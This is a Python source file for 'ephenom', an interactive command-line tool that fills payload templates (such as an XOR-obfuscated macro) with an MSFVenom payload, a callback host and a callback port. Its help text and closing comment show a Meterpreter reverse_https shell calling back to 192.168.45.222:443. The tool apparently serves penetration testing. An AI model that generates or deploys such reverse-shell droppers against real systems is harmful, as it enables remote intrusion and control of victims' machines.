#!/usr/bin/python
import argparse
import ep_templater
import os

def LoadTemplateList():
    try:
        all_files = os.listdir("templates/")
        txt_files = [os.path.splitext(file)[0] for file in all_files if file.endswith('.json')]
    except:
        print("Problem loading template folder exiting.")
        exit()
    return txt_files

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--template', default="", help="Name of the template.")
    parser.add_argument('-p', '--payload', default="", help="MSFVenom payload eg. windows/x64/meterpreter/reverse_https")
    parser.add_argument('-l', '--lhost',default="", help="Host to call back to.")
    parser.add_argument('-s', '--lport',default="", help="Port to call back to")
    parser.add_argument('-o', '--outraw', default="", help="Output the uncompiled code here.")
    args = parser.parse_args()
    
    title = """
                .__                                       
  ____  ______  |  |__    ____    ____    ____    _____   
_/ __ \ \____ \ |  |  \ _/ __ \  /    \  /  _ \  /     \  
\  ___/ |  |_> >|   Y  \\  ___/ |   |  \(  <_> )|  Y Y  \ 
 \___  >|   __/ |___|  / \___  >|___|  / \____/ |__|_|  / 
     \/ |__|         \/      \/      \/               \/  
     
     by yellephen.
     """
    
    print(title)


    goodCommand = False
    while goodCommand == False:

        print("Enter [list] to show templates or text search template names with eg. [list exe]")
        print("Get the template number and enter eg. [use 2] to get started.")


        command = input()

        if command == "list":
            loadedTemplateList = LoadTemplateList()
            
        elif command.startswith("list "):
            search = command.split(" ")[1]
            txt_files = LoadTemplateList()
            loadedTemplateList = [txt_file for txt_file in txt_files if search.lower() in txt_file.lower()]

        try:
            for index, txt_file in enumerate(loadedTemplateList, start=0):
                    print(f"{index}. {txt_file}")
        except:
            continue

        command = input()

        if command.startswith("use "):
            try:
                index = int(command.split(" ")[1])
                goodCommand = True
            except:
                print("Error in input. Try again.")
            template = loadedTemplateList[index]


    content = ep_templater.FillTemplate(template,args.payload,args.lhost,args.lport)
    
    if args.outraw != "":
        with open(args.outraw, 'w') as file:
            file.write(content)
        print("File output to " + args.outraw)
        
if __name__ == "__main__":
    main()



    #ep_templater.FillTemplate("xormacro","windows/meterpreter/reverse_https", "192.168.45.222", "443")
    